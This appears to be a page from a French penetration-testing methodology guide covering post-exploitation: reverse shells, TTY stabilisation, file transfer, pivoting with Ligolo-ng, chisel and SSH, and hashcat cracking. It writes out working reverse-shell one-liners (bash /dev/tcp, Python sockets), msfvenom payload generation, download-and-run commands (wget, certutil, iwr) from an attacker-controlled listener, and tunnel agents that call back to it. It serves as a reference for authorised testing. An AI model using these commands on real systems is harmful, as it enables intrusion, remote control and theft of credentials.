# 5 - Shells, transfert & pivot

Une fois l'exécution de commandes obtenue, l'objectif est d'établir un accès interactif fiable, puis de se déplacer dans l'environnement. Cette phase couvre la génération et la stabilisation des reverse shells, le transfert de fichiers entre l'attaquant et la cible, le pivot vers les réseaux internes et le cassage des hachages récupérés. Chaque étape ci-dessous reprend la commande exacte de la méthodologie, accompagnée de références externes vérifiées.

!!! note "Jetons"
    Les jetons entre accolades sont substitués automatiquement à partir de votre contexte : `{IP}` (cible courante), `{USER}` (utilisateur), `{IFACE}` (interface), etc. Le marqueur `<listener_ip>` désigne **votre IP d'écoute** (la machine de l'attaquant) ; remplacez-le par l'adresse de votre interface VPN/tap. Les ports (`4444`, `8000`, etc.) sont des valeurs d'exemple à adapter.

## Reverse shells & stabilization

Service : `reverse`. Générez la charge, mettez-vous en écoute, puis stabilisez le TTY. Catalogue de payloads : revshells.com.

!!! info "Références"
    - HackTricks - [Full TTYs (stabilisation du shell)](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/full-ttys.html)
    - PayloadsAllTheThings - [Reverse Shell Cheatsheet](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/)
    - [revshells.com](https://www.revshells.com/) - générateur interactif de reverse shells

### Listener

```bash
rlwrap nc -lvnp 4444
```

**Voir aussi :** [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/)

### Payloads (Linux)

```bash
bash -i >& /dev/tcp/<listener_ip>/4444 0>&1
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<listener_ip>",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

**Voir aussi :** [HackTricks - Reverse shells (Linux)](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)

### Payloads (msfvenom)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<listener_ip> LPORT=4444 -f exe -o s.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<listener_ip> LPORT=4444 -f elf -o s.elf
```

**Voir aussi :** [Kali - Metasploit Framework](https://www.kali.org/tools/metasploit-framework/) · [HackTricks - Reverse shells (Windows)](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/windows.html)

### Stabilize the TTY

```bash
# 1) in the target shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# 2) keystroke: Ctrl+Z  (backgrounds the shell)
# 3) in YOUR local terminal:
stty raw -echo; fg
# 4) back in the shell (Enter), type:
export TERM=xterm
```

**Voir aussi :** [HackTricks - Full TTYs](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/full-ttys.html)

## File transfer

Service : `transfer`. Montez un serveur côté attaquant, puis téléchargez côté cible.

!!! info "Références"
    - HackTricks - [Exfiltration (canaux de transfert de fichiers)](https://book.hacktricks.wiki/en/generic-hacking/exfiltration.html)
    - PayloadsAllTheThings - [Windows - Download and Execute](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/)

### Attacker-side server

```bash
python3 -m http.server 80
impacket-smbserver share . -smb2support
```

**Voir aussi :** [Kali - Impacket](https://www.kali.org/tools/impacket/)

### Download (Linux target)

```bash
wget http://<listener_ip>/f -O /tmp/f
curl http://<listener_ip>/f -o /tmp/f
```

**Voir aussi :** [HackTricks - Exfiltration](https://book.hacktricks.wiki/en/generic-hacking/exfiltration.html)

### Download (Windows target)

```bash
certutil -urlcache -f http://<listener_ip>/f f.exe
powershell iwr http://<listener_ip>/f -OutFile f.exe
```

**Voir aussi :** [PayloadsAllTheThings - Windows - Download and Execute](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/)

## Pivoting / tunneling

Service : `tunneling`. Rebondissez vers un réseau interne via la machine compromise.

!!! info "Références"
    - HackTricks - [Tunneling and Port Forwarding](https://book.hacktricks.wiki/en/generic-hacking/tunneling-and-port-forwarding.html)
    - [ligolo-ng (GitHub)](https://github.com/nicocha30/ligolo-ng) · [chisel (GitHub)](https://github.com/jpillora/chisel)

### Ligolo-ng (recommended)

```bash
# attacker: ./proxy -selfcert
# target  : ./agent -connect <listener_ip>:11601 -ignore-cert
```

**Voir aussi :** [ligolo-ng - dépôt et documentation](https://github.com/nicocha30/ligolo-ng) · [Kali - ligolo-ng](https://www.kali.org/tools/ligolo-ng/)

### Chisel (reverse SOCKS)

```bash
# attacker: ./chisel server -p 8000 --reverse
# target  : ./chisel client <listener_ip>:8000 R:1080:socks
```

**Voir aussi :** [chisel - usage](https://github.com/jpillora/chisel#usage)

### SSH tunnels

```bash
ssh -D 1080 {USER}@{IP}              # dynamic SOCKS
ssh -L 8080:127.0.0.1:80 {USER}@{IP}   # local forward
```

**Voir aussi :** [HackTricks - Tunneling and Port Forwarding](https://book.hacktricks.wiki/en/generic-hacking/tunneling-and-port-forwarding.html)

## Hash cracking (hashcat / john)

Service : `hashcat`. Identifiez le type de hachage (hashid) puis choisissez le bon mode **-m**.

!!! info "Références"
    - hashcat - [example_hashes (table des modes -m)](https://hashcat.net/wiki/doku.php?id=example_hashes)
    - hashcat - [Rule-based attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
    - [John the Ripper (GitHub)](https://github.com/openwall/john)

### Identify the hash

```bash
hashid '<hash>'
name-that-hash -t '<hash>'
```

**Voir aussi :** [Name-That-Hash (GitHub)](https://github.com/bee-san/Name-That-Hash) · [Kali - name-that-hash](https://www.kali.org/tools/name-that-hash/)

### Common -m modes

```bash
# 1000  NTLM            | 1800  sha512crypt ($6$)
# 5500  NetNTLMv1       | 5600  NetNTLMv2
# 13100 Kerberoast (TGS) | 18200 AS-REP
# 0 MD5 | 100 SHA1 | 3200 bcrypt | 7300 IPMI
```

**Voir aussi :** [hashcat - example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

### Run the crack

```bash
hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Voir aussi :** [Kali - hashcat](https://www.kali.org/tools/hashcat/) · [hashcat - Rule-based attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
